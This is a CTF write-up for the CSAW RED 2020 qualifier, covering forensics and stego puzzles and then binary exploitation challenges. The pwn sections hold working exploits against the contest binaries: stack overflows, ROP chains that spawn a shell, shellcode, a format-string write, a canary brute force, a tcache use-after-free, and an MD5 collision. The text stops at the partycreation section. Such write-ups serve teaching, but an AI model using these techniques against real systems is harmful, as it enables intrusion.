---
title: CSAW RED 2020 Qualifier
date: 2020-09-29
slug: /writeups/csaw-red-2020-qual
---

Solutions for all challenges from the CSAW RED 2020 Qualification Round. <!-- end -->Overall very good entry-level challenges with a couple harder ones mixed in.

Some of the scripts in this document have been clipped for the sake of brevity.

# misc - R\_U\_Awake
> https://discord.gg/Rg4rQqB

## Solution
Join the Discord and find the flag in [#announcements](https://discord.com/channels/745638559590908014/749300979735855206/756332986995179623).

## Flag
```
flag{U_R_Awake_a89fn3la}
```

# misc - Header Start
> This challenge should give you a good picture of a warm up challenge...if only we could view it
>
## Files
- myImageFile

## Solution
Opening the file in a hex editor, we observe what appear to be PNG chunk headers. Notably, the IHDR and IDAT headers (which are required in a PNG file) are immediately visible.

![IHDR and IDAT headers in the file](./headerstart/headers.png)

However, the PNG header is missing. Upon closer inspection, it appears that only the four magic bytes have been removed and everything else is intact.

![Inserting the PNG magic bytes](./headerstart/magic.png)

If we insert these bytes and open the file, we get the flag.

![Flag captured!](./headerstart/flag.png)

## Flag
```
flag{itZ_ju$7_A_w@Rm_Up}
```

# misc - Back to the Future
> Where we're going...

## Files
- backtothefuture.docx

## Solution
We are given a docx file with some fun pictures. As a docx is just a zip file with a specific format, first we'll start by unzipping it.

```
$ unzip backtothefuture.docx
Archive:  backtothefuture.docx
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: word/document.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/footnotes.xml
  inflating: word/endnotes.xml
  (output clipped)

$ ll
total 640
drwxr-xr-x  5 darin darin   4096 Sep 28 21:00  ./
drwxr-xr-x 25 darin darin   4096 Sep 28 20:58  ../
-rw-r--r--  1 darin darin   1678 Jan  1  1980 '[Content_Types].xml'
drwxr-xr-x  2 darin darin   4096 Sep 28 21:00  _rels/
-rw-r--r--  1 darin darin 629937 Sep 28 20:58  backtothefuture.docx
drwxr-xr-x  2 darin darin   4096 Sep 28 21:00  docProps/
drwxr-xr-x  5 darin darin   4096 Sep 28 21:00  word/
```

If we take a look at the `word/media` folder, we'll find all the fun pictures they put in the document, along with one that wasn't visible before:

![Flag captured!](./future/flag.png)

## Flag
```
flag{one.21_gigawatts!??!}
```

# misc - Cat
> Your cat is hiding your flag.

## Files
- happy_cat.jpg

## Solution
It's a cute cat! Flag is a string in the file.

```
$ strings happy_cat.jpg | grep flag
flag{Y0U_f0unD_h4PPy_cat_FL4G}@
```

## Flag
```
flag{Y0U_f0unD_h4PPy_cat_FL4G}
```

# misc - animal_friendship
> The druid in your party is a fan of the animal friendship spell. To get the flag, track them down in this packet capture, then report who they befriended here: `nc web.red.csaw.io 5017`

## Files
- animal_friendship.data

## Solution
The file we are given is a pcap. Open it in Wireshark or any similar tool.

![Analysis in Wireshark](./animal/wireshark.png)

We can see that there is a request for a jpg file that completes near the end of the capture. We can export this object with `File > Export Objects > HTTP...`.

![Extracted JPG](./animal/jpeg.jpg)

Submitting `squirrel` to the server gives us the flag.

## Flag
```
flag{m4k1n9_f0r3n51c5_53c0nd_n47ur3}
```

# misc - recovery
> Alice forgot her throwaway email address, but she has a packet capture of her traffic. Can you help her recover it? To get the flag, answer a question about this traffic on the server here: `nc web.red.csaw.io 5018`

## Files
- recovery.data

## Solution
We are given another pcap. This time the server asks us for Alice's email, so we can just search for her name.

![Searching for Alice](./recovery/email.png)

Submitting `alice_test@hotmail.com` to the server gives us the flag.

## Flag
```
flag{W1r3sh4rk,TCPfl0w,gr3p,57r1n95--7h3y'r3_4ll_f0r3n51c5_700l5}
```

# misc - Super Sonic
> Use some stego skills to retrieve the flag!

## Files
- supersonic.zip

## Solution
We are given a zip file with three files in it. The readme says:

```
Note to self: If I ever want to get that password, I'll have to face the music.
```

There must be some sort of password encoded in the audio file, so we take a look at the WAV in Sonic Visualiser:

![Spectrogram view](./supersonic/spec.png)

Looking at the spectrogram, we clearly see the word `python` written. This must be the password the readme is referring to. Since the only other file left is the JPEG, we take a look at that next.

![A neat car](./supersonic/car.jpg)

There are not many tools that work with JPEGs (due to compression) and include a password. We try steghide.

```
$ steghide extract -sf Car.jpeg -p 'python'
wrote extracted data to "flag.txt".
```

Success!

## Flag
```
flag{py1h0n_1s_c00l}
```

# misc - alert
The picture probably needs to be squared away...

## Files
- alert.png

## Solution
We are given a pretty cheesy joke in a PNG, though it appears to be truncated.

![Very unfunny joke if you ask me](./alert/joke.png)

The challenge description hints at a square, so we can edit the IHDR of the PNG to make the image a square. Make sure to fix the CRC32 checksum too.

![Changing the PNG size](./alert/pngsize.png)

This reveals the flag.

![What a flag](./alert/flag.png)

## Flag
```
flag{sT@y_s@F3}
```

# misc - big world
> Someone took my gold and a secret book with the flag! Can you help me find it?

## Files
- world.zip

## Solution
We are given a zip file which contains a Minecraft world. Note that we do not have to own Minecraft or open this world, as doing so would be a violation of the CSAW RED rules:

```
- Teams may use any freely available tool to complete a given challenge
- Tools that must be purchased (e.g., ordered online) are prohibited
```

Fortunately, a Python library called [mcworldlib](https://github.com/MestreLion/mcworldlib) lets us parse these files. The description says someone took a book, so we'll look for dropped items that are books.

```python
import mcworldlib as mc

world = mc.load('./level.dat')

entities = []

for chunk in world.get_chunks():
  for entity in chunk['']['Level']['Entities']:
    if 'Item' in entity and 'book' in entity['Item']['id'].lower():
      print(entity)
      print(entity['Item']['tag'])
```

Running this gives the flag.

## Flag
```
flag{techno_vs_dream}
```

# misc - otherplane
> Your party's cleric was scrying on the admins and intercepted one of them casting a "Contact Other Plane" spell. See if you can make sense of this traffic, then report who they contacted here: `nc web.red.csaw.io 5019`

## Files
- otherplane.data

## Solution
This is yet another pcap. We see a long stream of ICMP ping packets, but suspiciously, they contain lots of data. Starting at packet 4, all the packets contain 540 bytes of data, and curiously, there is what appears to be a JPEG header in it.

![The JPEG header in packet 4](./otherplane/jpegheader.png)

We can write a Python script using [scapy](https://scapy.net/) to grab all these packets and concatenate them into a file, remembering to skip the first two.

```python
from scapy.all import *

cap = rdpcap("./otherplane.pcap")
packets = cap.filter(lambda p: p.src == '10.67.8.102')
with open("otherplane.jpeg", "wb") as f:
  for p in packets[2:]:
    f.write(bytes(p[Raw]))
```

Viewing the JPEG and submitting `galactic octopus` to the server gives the flag.

![galactic octopus?](./otherplane/flag.jpg)


## Flag
```
flag{m0r3_l1k3_c0n74c7_9l455_pl4n3}
```

# misc - hack-a-mole
> Welcome to Hack-a-Mole, the hacker version of Whack-a-Mole! Beat all the levels to claim your flag. `nc web.red.csaw.io 5016`

## Solution
This is a rather straightforward challenge, though implementation is not trivial. We basically have to parse the hack-a-mole board, then send back the correct coordinates. The board sizes get larger as you go, and they start inserting non-mole objects too. Fortunately, you are allowed to get some of them wrong.

```python
from pwn import *

r = remote("web.red.csaw.io", 5016)

context.log_level = 'debug'

def parse():
  if b"Missed" in r.recvuntil("Score: "):
    print("missed one, continuing")
  r.recvline()
  r.recvline()
  board = r.recvuntil("                                                      \n\nWhack", drop=True)
  pos = board.index(b">-<")
  cols = len(board.splitlines()[0])//18
  rows = board.count(b"                                                      \n")
  spacing = 0
  for line in board.splitlines()[1:]:
    if b"                                           " in line:
      spacing += 1
    elif spacing > 0:
      break
  rows = rows // spacing
  rows = rows +1
  row = int(rows * (pos / len(board)))
  board = board.splitlines()
  for k, line in enumerate(board):
    if b">-<" in line:
      col = int(line.index(b">-<")/len(line)*cols)
      break
  return row, col

while True:
  board = parse()
  r.sendline(f"{board[0]} {board[1]}")
```

This is a very hastily-written script because they decided to release this challenge on the last day after many teams had the maximum score, so it just became a race to see who could implement this the fastest (some of the variable names and debug messages have been changed/removed to be a bit more appropriate). Sometimes it does not give the flag so it might need to be run a few times.

## Flag
```
flag{Wh4t3v3r_d1d_th3_p00r_m0l3_d0_t0_y0u?}
```

# misc - fabricator
> Forge an admin access card and pwn their box! This is both a crypto and a pwning challenge. `nc web.red.csaw.io 5012`

## Files
- fabricator
- fabricator.c

## Solution
As usual, we `checksec` before starting.
```
$ checksec fabricator
[*] '/home/darin/ctfs/red-2020/fabricator/fabricator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Curiously, it appears that most tools report a stack canary even though there isn't one. This is likely due to the binary being statically linked.

Taking a look at the source code, we see that it takes two inputs of length 400, then makes sure both of them start with the same prefix. Then, it checks if the hashes are valid and if they are, continues to `memcpy` the first input into a buffer of size 256. Clearly there is a buffer overflow here, so we just need a simple ROP chain to `execve('/bin/sh', NULL, NULL)`.

```c
void runGame(){
    char idCard[IDCARDSIZE];
    puts("---- ID Verification program ----\n");
    puts("   Please enter two Jangui ID cards ");
    puts("with the same MD5 sums and different");
    puts("SHA-256 hashes.\n");
    puts("   Expected ID card prefix:\n");
    printf("%s\n",id_prefix);
    puts("");
    printf("   Input ID card 1: >");
    fflush(stdout);

    int card_1_length = read(0, id1, IDCARDBUFSIZE);
    printf("   Input ID card 2: >");
    fflush(stdout);

    int card_2_length = read(0, id2, IDCARDBUFSIZE);
    puts("Scanning...");
    if (strncmp(id1, id2, 0x40)!=0 || strncmp(id1, id_prefix,0x40)!=0){
        puts("Error: ID prefix mismatch.");
        exit(0);
    }else{
        if(!(validHashes(id1, id2, IDCARDBUFSIZE))){
            puts("Hashes do not check out!");
            exit(0);
        }
    }
    puts("Thank you for logging in, Jangui. You have been validated. Have a nice day.");
    memcpy(idCard, id1, IDCARDBUFSIZE); // <-- VULNERABILITY
    return;
}
```

Since the binary is statically linked, this is simple.

```python
id1 = b"Hi, my name is Jangui. My card is my passport. Please verify me."
id1 = id1.ljust(280, b"A")
id1 += p64(0x4010dc)  # pop rsi; ret
id1 += p64(0x6c10e0)  # .data
id1 += p64(0x41c0c4)  # pop rax; ret
id1 += b"/bin/sh\x00"
id1 += p64(0x485ff1)  # mov QWORD PTR [rsi], rax; ret
id1 += p64(0x41c0c4)  # pop rax; ret
id1 += p64(59)        # sys_execve
id1 += p64(0x4006c6)  # pop rdi; ret
id1 += p64(0x6c10e0)  # .data
id1 += p64(0x4010dc)  # pop rsi; ret
id1 += p64(0)         # argv
id1 += p64(0x4502e5)  # pop rdx; ret
id1 += p64(0)         # env
id1 += p64(0x407bac)  # syscall
```

The length of the padding can be found with a debugger by subtracting the location of the return address from the argument to `read()`. We aren't done yet, though, because we still need to make two valid IDs.

```c
int validHashes(const char* buf1, const char* buf2, int bufLength){
    char md5hash1[MD5_DIGEST_LENGTH];
    MD5(buf1, bufLength, md5hash1);
    char md5hash2[MD5_DIGEST_LENGTH];
    MD5(buf2, bufLength, md5hash2);
    if (strncmp(md5hash1, md5hash2, MD5_DIGEST_LENGTH)){
        puts("MD5 hashes are not the same and should be!");
        return 0;
    }
    char sha256hash1[SHA256_DIGEST_LENGTH];
    SHA256(buf1, bufLength, sha256hash1);
    char sha256hash2[SHA256_DIGEST_LENGTH];
    SHA256(buf2, bufLength, sha256hash2);
    if (!strncmp(sha256hash1, sha256hash2,SHA256_DIGEST_LENGTH)){
        puts("SHA256 hashes are the same and should not be!");
        return 0;
    }
    return 1;
}
```

To satisfy these conditions, we need to make sure the MD5 hashes of the two IDs are the same, but the SHA256 hashes are not. MD5 is a very old hashing algorithm and it has been broken several times, whereas SHA256 is quite strong. Therefore, it should not be difficult to find an MD5 collision that is not a SHA256 collision.

Since there are many bytes of padding in the middle, we have plenty of space to generate a collision. Because of the way MD5 works, we can cause two different plaintexts to have the same hash by messing with a single block of 128 bytes in the middle. To do this we can use [HashClash](https://www.win.tue.nl/hashclash/).

```
$ md5sum id*
8c1faa48b2cd89117cb2618bfc3159e9  id1
8c1faa48b2cd89117cb2618bfc3159e9  id2
$ sha256sum id*
62fda9f92ad8d19c5b4b78fe744e789846e72a69129f6cb02c36e6208e7aba10  id1
d7e06ff5604125d34350d07f6f27dd057161a3570ecebc3ee8e7fbfe39b7bc8b  id2
$ xxd id1
00000000: 4869 2c20 6d79 206e 616d 6520 6973 204a  Hi, my name is J
00000010: 616e 6775 692e 204d 7920 6361 7264 2069  angui. My card i
00000020: 7320 6d79 2070 6173 7370 6f72 742e 2050  s my passport. P
00000030: 6c65 6173 6520 7665 7269 6679 206d 652e  lease verify me.
00000040: 7a04 8fad 03dd c22a 4a2a fc59 fac3 b003  z......*J*.Y....
00000050: 0b43 4343 8902 4fee 51a2 770a cabf 9630  .CCC..O.Q.w....0
00000060: 7dfd fde6 be67 80f0 cb23 4104 158e 9ab7  }....g...#A.....
00000070: 5670 c6b5 a9f9 cc56 2615 cb65 9792 2c2b  Vp.....V&..e..,+
00000080: c87f 5c4e 71d2 09bf edbc c38a 9825 dde3  ..\Nq........%..
00000090: ad13 db4e 6c5c 32e1 8bc5 40df 8b5f a8c6  ...Nl\2...@.._..
000000a0: d3bb 4828 af04 7214 780a c67a 3c40 f19e  ..H(..r.x..z<@..
000000b0: 5438 7c79 06f6 9902 9851 37b9 2073 06d8  T8|y.....Q7. s..
000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000100: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000110: 4141 4141 4141 4141 dc10 4000 0000 0000  AAAAAAAA..@.....
00000120: e010 6c00 0000 0000 c4c0 4100 0000 0000  ..l.......A.....
00000130: 2f62 696e 2f73 6800 f15f 4800 0000 0000  /bin/sh.._H.....
00000140: c4c0 4100 0000 0000 3b00 0000 0000 0000  ..A.....;.......
00000150: c606 4000 0000 0000 e010 6c00 0000 0000  ..@.......l.....
00000160: dc10 4000 0000 0000 0000 0000 0000 0000  ..@.............
00000170: e502 4500 0000 0000 0000 0000 0000 0000  ..E.............
00000180: ac7b 4000 0000 0000                      .{@.....
$ xxd id2
00000000: 4869 2c20 6d79 206e 616d 6520 6973 204a  Hi, my name is J
00000010: 616e 6775 692e 204d 7920 6361 7264 2069  angui. My card i
00000020: 7320 6d79 2070 6173 7370 6f72 742e 2050  s my passport. P
00000030: 6c65 6173 6520 7665 7269 6679 206d 652e  lease verify me.
00000040: 7a04 8fad 03dd c22a 4a2a fc59 fac3 b003  z......*J*.Y....
00000050: 0b43 43c3 8902 4fee 51a2 770a cabf 9630  .CC...O.Q.w....0
00000060: 7dfd fde6 be67 80f0 cb23 4104 150e 9bb7  }....g...#A.....
00000070: 5670 c6b5 a9f9 cc56 2615 cbe5 9792 2c2b  Vp.....V&.....,+
00000080: c87f 5c4e 71d2 09bf edbc c38a 9825 dde3  ..\Nq........%..
00000090: ad13 dbce 6c5c 32e1 8bc5 40df 8b5f a8c6  ....l\2...@.._..
000000a0: d3bb 4828 af04 7214 780a c67a 3cc0 f09e  ..H(..r.x..z<...
000000b0: 5438 7c79 06f6 9902 9851 3739 2073 06d8  T8|y.....Q79 s..
000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000100: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000110: 4141 4141 4141 4141 dc10 4000 0000 0000  AAAAAAAA..@.....
00000120: e010 6c00 0000 0000 c4c0 4100 0000 0000  ..l.......A.....
00000130: 2f62 696e 2f73 6800 f15f 4800 0000 0000  /bin/sh.._H.....
00000140: c4c0 4100 0000 0000 3b00 0000 0000 0000  ..A.....;.......
00000150: c606 4000 0000 0000 e010 6c00 0000 0000  ..@.......l.....
00000160: dc10 4000 0000 0000 0000 0000 0000 0000  ..@.............
00000170: e502 4500 0000 0000 0000 0000 0000 0000  ..E.............
00000180: ac7b 4000 0000 0000                      .{@.....
```

These two files are very similar, but not the same. Crucially, their MD5 hashes are identical. Sending these two files as IDs gives us a shell.

## Flag
```
flag{MISC_574nd5_f0r_Mul71cl4551n9_15_5up3r_c00l!}
```

# pwn - Feast
> We've prepared a special meal for you. You just need to find it. (This is a 32 bit program) `nc pwn.red.csaw.io 5001`

## Files
- feast
- feast.c

## Solution
```
$ checksec feast
[*] '/home/darin/ctfs/red-2020/feast/feast'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Looking at the source, there is a trivial buffer-overflow in `vuln()` that is even pointed out to us in a comment.

```c
void vuln(){
    char buf[INPUTBUF];
    gets(buf); //ruh-roh
}
```

`gets()` does no boundary checking and we can write as much data as we want to `buf`. The length of the padding can be found with a debugger by subtracting the location of the return address from the argument to `gets()`.

```python
from pwn import *

exe = ELF("./feast")
r = remote("pwn.red.csaw.io", 5001)

r.sendlineafter("> ", b"A"*44 + p32(exe.sym["winner_winner_chicken_dinner"]))
r.interactive()
```

## Flag
```
flag{3nj0y_7h3_d1nN3r_B16_w1Nn3r!}
```

# pwn - helpme
> A young'un like you must be a tech whiz. Can you show me how to use this here computer? (This is a 64 bit program)
>
> `nc pwn.red.csaw.io 5002`

## Files
- helpme

## Solution
```
$ checksec helpme
[*] '/home/darin/ctfs/red-2020/helpme/helpme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This time, source is not given, so we can reverse this binary with something like Ghidra. The `main()` function does some initialization, then calls `vuln()` which is the part we're interested in.

```c
void vuln(void)
{
  char buf [0x20];

  printf("I can never remember the command to open flag files... \nCan you do it for me? \n> ");
  gets(buf);
  return;
}
```

Once again the binary uses `gets()`, so we can approach this in the same way as Feast. There is an unreferenced function called `binsh()` that is helpful to us.

```c
void binsh(void)
{
  system("/bin/sh");
  return;
}
```

All we need to do is return here. One small catch is that we need to insert an extra `ret` gadget to ensure that the stack is aligned to a 16-byte boundary before calling `system()`.

```python
from pwn import *

exe = ELF("./helpme")
r = remote("pwn.red.csaw.io", 5002)

rop = ROP(exe)
ret = rop.find_gadget(["ret"]).address
r.sendline(b"A"*40 + p64(ret) + p64(exe.sym["binsh"]))

r.interactive()
```

## Flag
```
flag{U_g07_5h311!_wh4t_A_h4xor!}
```

# pwn - Level 1 Spellcode
> Welcome Level 1 wizard! Write your own spellcode to pwn your way to the wizards' lab. (Attribution: the "spellcode" idea is not original, see [sourcery.pwnadventure.com](http://sourcery.pwnadventure.com/) (not part of the challenge.) For shellcoding references and examples, see "Hacking: the Art of Exploitation" by Jon Erickson or reference [shell-storm.org/shellcode](http://shell-storm.org/shellcode). For more Level 1 spells (not required to solve), see the D&D Player's Handbook, 5th edition. `nc pwn.red.csaw.io 5000`

## Files
- level\_1\_spellcode
- level\_1\_spellcode.c

## Solution
```
$ checksec level_1_spellcode
[*] '/home/darin/ctfs/red-2020/level1/level_1_spellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Things you love to see. Looking at the code, it appears that option 6 will take any shellcode we enter and run it.

```c
    else if (selection == 6){
        printf("Enter your spell code (up to %d bytes): > ", BUFSIZE);
        fflush(stdout);
        // Make sure there is something to run
        int code_length = read(0, shellcode, BUFSIZE);
        if(code_length > 0){
            void (*runthis)() = (void (*)()) shellcode;
            runthis();
        }
    }
```

pwntools can generate this shellcode for us, all we need to do is send it.

```python
from pwn import *

r = remote("pwn.red.csaw.io", 5000)

r.sendline("6")
r.sendline(asm(shellcraft.i386.sh()))

r.interactive()
```

## Flag
```
flag{w3lc0m3_t0_sh3llc0d1ng!!!}
```

# pwn - Actually not guessy
> No-one has ever guessed my favorite numbers. Can you?
>
> `nc pwn.red.csaw.io 5007`

## Files
- actually\_not\_guessy

## Solution
```
$ checksec actually_not_guessy
[*] '/home/darin/ctfs/red-2020/actually/actually_not_guessy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can throw this in Ghidra to reverse it. After cleaning up the decompilation a bit, `vuln()` is what we're interested in.

```c
void vuln(void)
{
  char buf [0x24];

  init();
  puts("Would you like to play a game? \nIf you can guess my three favorite numbers...you win!");
  fgets(buf,0x48,stdin);
  return;
}
```

This is a fairly standard ROP challenge. Since we're in 32-bit, some things are a bit easier. Also note that there is a function that will print the flag for us if we give it the right arguments.

```c
void all_I_do_is_win(uint param_1, uint param_2, uint param_3)
{
  char flagbuf [0x28];
  FILE *flag;

  if (param_1 == 0x600dc0de) {
    if (param_2 == 0xacce5515) {
      if (param_3 == 0xfea51b1e) {
        flag = fopen("flag.txt","r");
        if (flag == (FILE *)0x0) {
          puts("If you\'re seeing this, the flag file is missing. Please let an admin know!");
          exit(0);
        }
        fgets(flagbuf, 0x28, flag);
        puts(flagbuf);
        exit(0);
      }
      puts("So close!");
    }
    else {
      puts("You\'re getting there...");
    }
  }
  else {
    puts("Not quite.");
  }
  return;
}
```

Here's the stack layout and all the code:

```
buf     AAAA
        AAAA
        AAAA
        ...
return  all_I_do_is_win
return  AAAA
arg     0x600dc0de
arg     0xacce5515
arg     0xfea51b1e
```



```python
from pwn import *

exe = ELF("./actually_not_guessy")
r = remote("pwn.red.csaw.io", 5007)

r.sendline(b"A"*44 + p32(exe.sym["all_I_do_is_win"]) + b"AAAA" + p32(0x600dc0de) + p32(0xacce5515) + p32(0xfea51b1e))

r.interactive()
```

## Flag
```
flag{w0w_R_y0u_A_m1nD_r34D3r?}
```

# pwn - prisonbreak
> Roll a natural 20 to escape from Profion's dungeon! `nc pwn.red.csaw.io 5004`

## Files
- prisonbreak
- prisonbreak.c

## Solution
Looking at the source code, we see that the program will give us the flag if `roll_value` is 20. However, the `roll20()` function only gives values [1, 19].

```c
if(roll_value == 20){
    puts("   \"AWK! Natural 20. Natural 20.\"");
    puts("   You pry the bars apart with your bare hands and escape!");
    puts("");
    fflush(stdout);
    win();
}
```

```c
void win() {
    char buf[FLAGBUF];
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        puts("If you receive this output, then there's no flag.txt on the server -- message an admin on Discord.");
        puts("Alternatively, you may be testing your code locally, in which case you need a fake flag.txt file in your directory.");
        exit(0);
    }

    fgets(buf,FLAGBUF,f);
    printf("%s",buf);
    exit(0);
}

void roll20(){
    // Random number generator
    time_t t;
    srand((unsigned) time(&t));
    roll_value = rand() % 19 + 1;
}
```

There is a format-string vulnerability in the middle of `runChallenge()`, as it feeds our input directly into `printf()`

```c
getInput(PHRASELENGTH, phrase);
puts("");
printf("   \"AWK! ");
printf(phrase);
```

We start by finding the offset in our format string until we hit our input. After some trial and error, we find that we hit our input starting at offset 6.

```
What do you say? >AAAAAAAA %6$p

"AWK! AAAAAAAA 0x4141414141414141," says the parrot.
```

We want to write to `roll_value`, which has an 8-byte address (since we're in 64-bit). This means we have just 20-8=12 bytes to write the value there. The winning payload is:

```
'%20c%7$n' + p64(roll_value)
```

Since index 6 is the start of our format string, index 7 is 8 bytes after that, the address of `roll_value`. We print 20 bytes of padding, then write it with the `n` specifier.

## Flag
```
flag{Y0u_s41d_th3_wr1t3_th1ng}
```

# pwn - coalmine
> This bird will definitely protect me down in the mine.
>
> `nc pwn.red.csaw.io 5005`

## Files
- coalmine

## Solution
```
$ checksec coalmine
[*] '/home/darin/ctfs/red-2020/coalmine/coalmine'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Opening this in Ghidra, we see that there's a custom stack canary implementation.

```c
void carry_bird_into_mine(void)
{
  FILE *canary_file;

  canary_file = fopen("birdy.txt","r");
  if (canary_file == (FILE *) 0x0) {
    puts("Looks like the bird has left the server. -- Please let an admin know on Discord!");
    printf("If you\'re running this locally, you\'ll need a birdy of your own!");
    exit(0);
  }
  fread(&global_birdy, 0x1, 0x8, canary_file);
  fclose(canary_file);
  return;
}

void name_it(void)
{
  size_t length;
  char buf [0x20];
  undefined name [0x20];
  long canary;

  canary = global_birdy;
  printf("How many letters should its name have?\n> ");
  fgets(buf, 0x20, stdin);
  length = atoi(buf);
  printf("And what\'s the name? \n> ");
  read(0,name,length);
  if (memcmp(&canary, &global_birdy, 0x8) != 0) {
    puts("*** Stack Smashing Detected *** : Are you messing with my canary?!");
    exit(0);
  }
  printf("Ok... its name is %s\n",name);
  fflush(stdout);
  return;
}
```

The vulnerability here is that the canary is not randomized on each run - its value is stored in a file. Since we have great control of how many bytes we overwrite, we can simply overwrite the bottom byte of the canary only. By trying all 256 possible values for this byte until we find the one that does not exit, we will have recovered one byte of the canary. Continuing this process for eight bytes gives us the canary.

```python
def attempt(offset, canary):
    with context.local(log_level="error"):
        r = remote("pwn.red.csaw.io", 5005)
        r.sendlineafter("> ", str(offset+32))
        r.sendafter("> ", b"A"*32 + canary)
        good = b"***" not in r.recv()
        r.close()
        return good

canary = b""
for offset in range(1, 9):
    for k in range(256):
        if attempt(offset, canary + bytes([k])):
            canary += bytes([k])
            break
```

We find that the canary is `NECGLSPQ`. From here, it is a straightforward ROP challenge, as described in "pwn - Actually not guessy". There is a function that will print the flag to return to.

```c
void tweet_tweet(void)
{
  char flagbuf [0x28];
  FILE *flag;

  flag = fopen("flag.txt", "r");
  if (flag == (FILE *)0x0) {
    puts(
        "If you receive this output, then there\'s no flag.txt on the server -- message an admin onDiscord."
        );
    puts(
        "Alternatively, you may be testing your code locally, in which case you need a fakeflag.txt file in your directory."
        );
    exit(0);
  }
  fgets(flagbuf, 0x28, flag);
  puts(flagbuf);
  exit(0);
}
```

## Flag
```
flag{H0w_d1d_U_g37_pA5t_mY_B1rD???}
```

# pwn - Level 2 Spellcode
> Level up your spellcoding! No source code this time. `nc pwn.red.csaw.io 5009`

## Files
- level\_2\_spellcode

## Solution
```
$ checksec level_2_spellcode
[*] '/home/darin/ctfs/red-2020/level2/level_2_spellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

This is (as expected) similar to Level 1. However, looking at the decompilation reveals that the program reads 5 null bytes into the middle of our shellcode.

```c
puts("Good idea, but I forget how to cast that spell.");
puts("Can you remind me?\n");
printf("Enter your spell code (up to %d bytes): > ",0x28);
fflush(stdout);
sVar1 = read(0, shellcode, 0x28);
fd = open("/dev/zero", 0);
read(fd, shellcode+0xc, 0x5);
if (0 < sVar1) {
  (*(code *)shellcode)();
}
```

To solve this, we can put the bulk of our shellcode after this part, and use the first few bytes (before the nulls) to jump down to the main shellcode. Here's what that looks like in memory:

```
=> 0xfff62864:  xor    edx,edx
   0xfff62866:  jmp    0xfff62875
   0xfff62868:  nop
   0xfff62869:  nop
   0xfff6286a:  nop
   0xfff6286b:  nop
   0xfff6286c:  nop
   0xfff6286d:  nop
   0xfff6286e:  nop
   0xfff6286f:  nop
       ...
   0xfff62875:  xor    eax,eax
   0xfff62877:  push   eax
   0xfff62878:  push   0x68732f2f
   0xfff6287d:  push   0x6e69622f
   0xfff62882:  mov    ebx,esp
   0xfff62884:  push   eax
   0xfff62885:  push   ebx
   0xfff62886:  mov    ecx,esp
   0xfff62888:  mov    al,0xb
   0xfff6288a:  int    0x80
```

Sending this gives a shell.

## Flag
```
flag{n1c3_h4nd-cr4f73d_sp3llc0d3}
```

# pwn - worstcodeever
> my friend writes some bad code `nc pwn.red.csaw.io 5008`

## Files
- worstcodeever
- worstcodeever.c
- Makefile
- libc-2.27&#46;so

## Solution
```
$ checksec worstcodeever
[*] '/home/darin/ctfs/red-2020/worstcodeever/worstcodeever'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looking at the source, we are allowed to choose from 4 different options, a maximum of 50 times. The libc version is 2.27, which implies the use of tcache with no security checks. Note that we can not control the size of the allocations, but the pointers are not nulled after removing a friend, so there is a use-after-free and double-free vulnerability.

```c
if (friend_type[index] != 0)
    free(friend_list[index]->identity.name);
free(friend_list[index]);
// friend_type[index] NOT set to NULL!
```

We are allowed to edit our friends after they are freed, meaning that we can easily control the `fd` pointers on the tcache.

Since the binary does not use Full RELRO, we can leak a libc pointer from the GOT. Since we can only have 10 friends, I tried to minimize the number of friends we needed to make (just like real life).

```python
add_robot(0x41414141, 0x42424242)
add_robot(0x41414141, 0x42424242)
remove_friend(1)
edit_robot(1, exe.sym["friend_list"], 0x42424242)
add_robot(0x41414141, 0x42424242)
add_robot(exe.got["setvbuf"], 0x42424242)
display_friend(0)
r.recvuntil("barcode tag: ")
libc.address = int(r.recvline()) - libc.sym["setvbuf"]
log.info(f"LIBC @ 0x{libc.address:x}")
```

By getting `malloc()` to return a pointer at `friend_list`, we can simply edit friend number 3 to write an arbitrary pointer to `friend_list[0]`, then edit friend number 0 to write an arbitrary value to that pointer, all without creating any new friends. This first step set the value of friend 0 to `setvbuf@GOT`, and then displays friend 0 to leak a libc address. Overwriting `__free_hook` with a one gadget and removing a friend gives a shell.

```python
edit_robot(3, libc.sym["__free_hook"], 0x43434343)
edit_robot(0, libc.address + one_gadgets[1], 0)
remove_friend(1)
```

## Flag
```
flag{d03s_s0urc3_3v3n_h3lp}
```

# pwn - partycreation
> Hackers assemble !`nc pwn.red.csaw.io 5010`

## Files
- partycreation.c
- partycreation
- libc-2.27&#46;so

## Solution
```
$ checksec partycreation
